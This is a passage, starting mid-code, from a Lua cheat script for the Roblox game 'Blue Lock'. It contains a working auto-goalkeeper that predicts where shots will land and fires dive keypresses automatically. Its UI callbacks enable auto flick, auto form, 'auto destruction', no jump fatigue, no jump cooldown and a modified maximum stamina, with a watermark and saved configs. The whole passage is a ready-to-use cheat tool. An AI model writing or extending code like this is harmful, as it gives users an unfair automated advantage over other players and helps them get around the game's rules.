    if dx > 0 then return "RIGHT" else return "LEFT" end
end

local function performDive(dir, jump)
    if jump then 
        pressKeyOnce("Space")
    end
    
    if dir == "LEFT" then
        pressKeyOnce("X")
    elseif dir == "RIGHT" then
        pressKeyOnce("C")
    else
        pressKeyOnce("F")
    end
end

-- Auto GK Main Loop
RunService.RenderStepped:Connect(function()
    local keeperRoot = getKeeperRoot()
    if not keeperRoot then
        predictionLabel:SetText('Prediction: --')
        statusLabel:SetText('Status: Waiting for keeper...')
        AutoGK.activePlan = nil
        return
    end

    AutoGK.instantMode = UserInputService:IsKeyDown(Enum.KeyCode[Options.GK_InstantKey.Value] or Enum.KeyCode.T)

    if AutoGK.holdMode then
        AutoGK.enabled = UserInputService:IsKeyDown(Enum.KeyCode[Options.GK_AutodiveKey.Value] or Enum.KeyCode.U)
    end
    
    modeLabel:SetText("Mode: " .. (AutoGK.holdMode and "HOLD" or "TOGGLE") .. " (Press P)")

    local bestBall = nil
    local bestMag = 0

    for _, ball in ipairs(ballsFolder:GetChildren()) do
        if ball:IsA("BasePart") then
            local vel = ball.AssemblyLinearVelocity or ball.Velocity
            local speed = vel.Magnitude
            if speed > bestMag then
                bestMag = speed
                bestBall = ball
            end
        end
    end

    if not bestBall then
        predictionLabel:SetText('Prediction: --')
        statusLabel:SetText('Status: No balls.')
        timingLabel:SetText('Timing: --')
        AutoGK.activePlan = nil
        return
    end

    local ballPos = bestBall.Position
    local ballVel = bestBall.AssemblyLinearVelocity or bestBall.Velocity

    local hitTime, hitPos, goalSide, bounced, goalFront, localHit = predictGoalHit(ballPos, ballVel)

    if not hitTime then
        predictionLabel:SetText('Prediction: --')
        statusLabel:SetText('Status: No goal impact.')
        timingLabel:SetText('Timing: --')
        AutoGK.activePlan = nil
        return
    end

    if goalSide ~= nil and hitTime ~= nil and hitPos ~= nil then
        predictionLabel:SetText(string.format(
            "Prediction: %s | %.2fs | Y=%.1f",
            tostring(goalSide),
            tonumber(hitTime) or 0,
            tonumber(hitPos.Y) or 0
        ))
    else
        predictionLabel:SetText("Prediction: --")
    end

    statusLabel:SetText(string.format("X: %.1f", localHit.X))

    local diveDir = chooseDive(goalFront, localHit, keeperRoot.Position)
    local shouldJump = hitPos.Y >= AutoGK.jumpHeightThreshold

    local diveTriggerTime = hitTime - AutoGK.diveOffset
    if diveTriggerTime < 0 then diveTriggerTime = 0 end

    AutoGK.activePlan = {
        triggerTime = tick() + diveTriggerTime,
        diveDir = diveDir,
        shouldJump = shouldJump,
        plannedBall = bestBall
    }

    local actionDesc = string.format("%s%s", diveDir, shouldJump and ", JUMP" or "")
    timingLabel:SetText(string.format("Timing: in %.2fs (%s)", diveTriggerTime, actionDesc))
end)

-- Auto GK Execution Loop
RunService.RenderStepped:Connect(function()
    if AutoGK.instantMode then
        local keeperRoot = getKeeperRoot()
        if not keeperRoot then return end
        
        local bestBall = nil
        local bestMag = 0
        for _, ball in ipairs(ballsFolder:GetChildren()) do
            if ball:IsA("BasePart") then
                local vel = ball.AssemblyLinearVelocity or ball.Velocity
                local speed = vel.Magnitude
                if speed > bestMag then
                    bestMag = speed
                    bestBall = ball
                end
            end
        end
        
        if bestBall then
            local ballPos = bestBall.Position
            local ballVel = bestBall.AssemblyLinearVelocity or bestBall.Velocity
            
            local originalTimeStep = AutoGK.timeStep
            AutoGK.timeStep = 0.00005
            
            local hitTime, hitPos, goalSide, bounced, goalFront, localHit = predictGoalHit(ballPos, ballVel)
            
            AutoGK.timeStep = originalTimeStep
            
            if hitTime and hitTime > 0.02 then
                local diveDir = chooseDive(goalFront, localHit, keeperRoot.Position)
                local shouldJump = hitPos.Y >= AutoGK.jumpHeightThreshold
                
                performDive(diveDir, shouldJump)
                
                local actionDesc = string.format("%s%s", diveDir, shouldJump and ", JUMP" or "")
                timingLabel:SetText(string.format("INSTANT EXECUTED! (%s)", actionDesc))
                AutoGK.activePlan = nil
                task.wait(0.1)
                return
            end
        end
    end
    
    if not AutoGK.activePlan then return end
    local now = tick()
    if AutoGK.enabled and now >= AutoGK.activePlan.triggerTime then
        performDive(AutoGK.activePlan.diveDir, AutoGK.activePlan.shouldJump)
        
        local actionDesc = string.format("%s%s", AutoGK.activePlan.diveDir, AutoGK.activePlan.shouldJump and ", JUMP" or "")
        timingLabel:SetText(string.format("EXECUTED! (%s)", actionDesc))
        AutoGK.activePlan = nil
    end
end)

-- Auto GK Keybind Handling
UserInputService.InputBegan:Connect(function(key, gp)
    if gp then return end
    
    if key.KeyCode == (Enum.KeyCode[Options.GK_AutodiveKey.Value] or Enum.KeyCode.U) then
        if not AutoGK.holdMode then
            AutoGK.enabled = not AutoGK.enabled
            Toggles.GK_Autodive:SetValue(AutoGK.enabled)
        end
    end
    
    if key.KeyCode == (Enum.KeyCode[Options.GK_ToggleModeKey.Value] or Enum.KeyCode.P) then
        AutoGK.holdMode = not AutoGK.holdMode
        if AutoGK.holdMode then
            AutoGK.enabled = false
            Toggles.GK_Autodive:SetValue(false)
        end
        Toggles.GK_ModeToggle:SetValue(not AutoGK.holdMode)
        modeLabel:SetText("Mode: " .. (AutoGK.holdMode and "HOLD" or "TOGGLE") .. " (Press P)")
    end
end)

-- ========================================
-- CALLBACKS / OnChanged Handlers
-- ========================================

-- Auto Flick Callbacks
Toggles.AutoFlick:OnChanged(function()
    AutoFlick.enabled = Toggles.AutoFlick.Value
end)

Options.FHeight:OnChanged(function()
    AutoFlick.flickupper = Options.FHeight.Value
end)

Options.FPower:OnChanged(function()
    AutoFlick.flickpower = Options.FPower.Value
end)

Options.FDirectionBuff:OnChanged(function()
    AutoFlick.directionbuff = Options.FDirectionBuff.Value
end)

Options.FlickConfig:OnChanged(function()
    local value = Options.FlickConfig.Value
    if value == "5'3 - 5'5" then
        Options.FHeight:SetValue(5.9)
        Options.FPower:SetValue(-3.121)
        Options.FDirectionBuff:SetValue(3.55)
    elseif value == "6'0 - 6'3" then
        Options.FHeight:SetValue(6)
        Options.FPower:SetValue(-3.121)
        Options.FDirectionBuff:SetValue(3.12)
    elseif value == "5'8 - 5'11" then
        Options.FHeight:SetValue(6)
        Options.FPower:SetValue(-3.121)
        Options.FDirectionBuff:SetValue(3.12)
    end
end)

Options.FlickKeybind:OnClick(function()
    if AutoFlick.enabled then
        executeFlick()
    end
end)

-- Auto Emperor Callback
Toggles.AutoEmp:OnChanged(function()
    AutoEmperor.enabled = Toggles.AutoEmp.Value
end)

-- Auto Destruction Callbacks
Toggles.AutoDest:OnChanged(function()
    AutoDestruction.enabled = Toggles.AutoDest.Value
end)

Options.GoalDistanceSettings:OnChanged(function()
    AutoDestruction.goalDistance = Options.GoalDistanceSettings.Value
end)

-- Auto Form Callbacks
Toggles.AutoForm:OnChanged(function()
    AutoForm.enabled = Toggles.AutoForm.Value
end)

Toggles.StrongAutoFormToggle:OnChanged(function()
    AutoForm.strongAutoFormEnabled = Toggles.StrongAutoFormToggle.Value
end)

Options.StrongAutoFormHeight:OnChanged(function()
    AutoForm.strongAutoFormHeight = Options.StrongAutoFormHeight.Value
end)

-- Fatigue & Cooldown Callbacks
Toggles.NoJumpFatigue:OnChanged(function()
    NoJumpFatigue.enabled = Toggles.NoJumpFatigue.Value
end)

Toggles.NoJumpCooldown:OnChanged(function()
    NoJumpCooldown.enabled = Toggles.NoJumpCooldown.Value
end)

-- Stamina Callback
Options.MaxStam:OnChanged(function()
    local character = player.Character
    if not character then return end
    
    local stamina = character:FindFirstChild("Stamina")
    if stamina and stamina:IsA("NumberValue") then
        stamina:SetAttribute("Max", Options.MaxStam.Value)
    end
end)

-- Auto GK Callbacks
Toggles.GK_Autodive:OnChanged(function()
    if not AutoGK.holdMode then
        AutoGK.enabled = Toggles.GK_Autodive.Value
    end
end)

Toggles.GK_ModeToggle:OnChanged(function()
    AutoGK.holdMode = not Toggles.GK_ModeToggle.Value
    if AutoGK.holdMode then
        AutoGK.enabled = false
        Toggles.GK_Autodive:SetValue(false)
    end
end)

Options.GK_DiveOffset:OnChanged(function()
    AutoGK.diveOffset = Options.GK_DiveOffset.Value
end)

Options.GK_MiddleTolerance:OnChanged(function()
    AutoGK.middleTolerance = Options.GK_MiddleTolerance.Value
end)

-- ========================================
-- UI SETTINGS
-- ========================================
Library:SetWatermarkVisibility(true)

local FrameTimer = tick()
local FrameCounter = 0
local FPS = 60

local WatermarkConnection = RunService.RenderStepped:Connect(function()
    FrameCounter += 1

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter
        FrameTimer = tick()
        FrameCounter = 0
    end

    Library:SetWatermark(('Blue Lock Script | %s fps | %s ms'):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ))
end)

Library.KeybindFrame.Visible = true

Library:OnUnload(function()
    WatermarkConnection:Disconnect()
    print('Script unloaded!')
    Library.Unloaded = true
end)

-- UI Settings Tab
local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')

MenuGroup:AddButton({
    Text = 'Unload',
    Func = function() Library:Unload() end,
    DoubleClick = false,
    Tooltip = 'Unload the script'
})

MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
    Default = 'End',
    NoUI = true,
    Text = 'Menu keybind'
})

Library.ToggleKeybind = Options.MenuKeybind

-- Theme & Save Manager
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

ThemeManager:SetFolder('BluelockScript')
SaveManager:SetFolder('BluelockScript/configs')

SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])

SaveManager:LoadAutoloadConfig()

print('‚úÖ Blue Lock Script loaded successfully!')
